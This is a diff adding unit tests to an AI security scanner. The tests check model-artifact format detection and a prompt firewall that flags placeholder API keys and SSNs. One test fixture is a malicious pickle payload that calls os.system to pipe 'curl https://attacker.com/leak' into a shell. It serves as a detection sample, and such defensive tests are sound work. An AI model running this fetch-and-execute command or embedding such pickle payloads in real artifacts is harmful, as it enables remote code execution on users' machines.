@@ -87,6 +87,54 @@ class TestAiSecureEngine(unittest.TestCase):
         self.assertIn("deny_prompts_with_jailbreak_delimiters", in_rules)
         self.assertIn("filter_system_prompt_canary_leakage", out_rules)
 
+    def test_model_artifact_pickle_scan(self):
+        # 1. SafeTensors model artifact
+        res_safe = self.cli.scan_model_artifact("model.safetensors", b"\x00\x00\x00\x00\x00\x00\x00\x00{}")
+        self.assertTrue(res_safe["is_safe"])
+        self.assertEqual(res_safe["format"], "safetensors")
+        self.assertEqual(len(res_safe["findings"]), 0)
+
+        # 2. GGUF model artifact
+        res_gguf = self.cli.scan_model_artifact("llama3.gguf", b"GGUF\x03\x00\x00\x00")
+        self.assertTrue(res_gguf["is_safe"])
+        self.assertEqual(res_gguf["format"], "gguf")
+        self.assertEqual(len(res_gguf["findings"]), 0)
+
+        # 3. Malicious pickle checkpoint containing os.system / GLOBAL / REDUCE
+        malicious_bytes = b"cos.system\n(S'curl https://attacker.com/leak | sh'\ntR."
+        res_mal = self.cli.scan_model_artifact("checkpoint.pt", malicious_bytes)
+        self.assertFalse(res_mal["is_safe"])
+        self.assertEqual(res_mal["format"], "pickle")
+        self.assertIn("os.system", res_mal["detected_opcodes"])
+        self.assertEqual(len(res_mal["findings"]), 1)
+        self.assertEqual(res_mal["findings"][0]["rule_id"], "AI-SPM-006")
+        self.assertEqual(res_mal["findings"][0]["severity"], "CRITICAL")
+
+    def test_prompt_pii_firewall(self):
+        # Test prompt containing OpenAI API key
+        p_key = {
+            "id": "prompt-key-leak",
+            "prompt_text": "Here is my OpenAI API key: sk-proj-123456789012345678901234567890, please check it.",
+            "source": "api",
+            "target_model": "gpt-4o"
+        }
+        f_key = self.cli.inspect_prompt(p_key)
+        self.assertEqual(len(f_key), 1)
+        self.assertEqual(f_key[0]["rule_id"], "LLM06:2025")
+        self.assertIn("API Key", f_key[0]["title"])
+
+        # Test prompt containing SSN
+        p_ssn = {
+            "id": "prompt-ssn-leak",
+            "prompt_text": "Verify user with SSN 123-45-6789 for KYC review.",
+            "source": "api",
+            "target_model": "gpt-4o"
+        }
+        f_ssn = self.cli.inspect_prompt(p_ssn)
+        self.assertEqual(len(f_ssn), 1)
+        self.assertEqual(f_ssn[0]["rule_id"], "LLM06:2025")
+        self.assertIn("Social Security Number", f_ssn[0]["title"])
+
     def test_deterministic_ai_asset_hash(self):
         for a in self.inventory:
             raw = f"{a['id']}:{a['name']}:{a['asset_type']}:{a['provider']}"
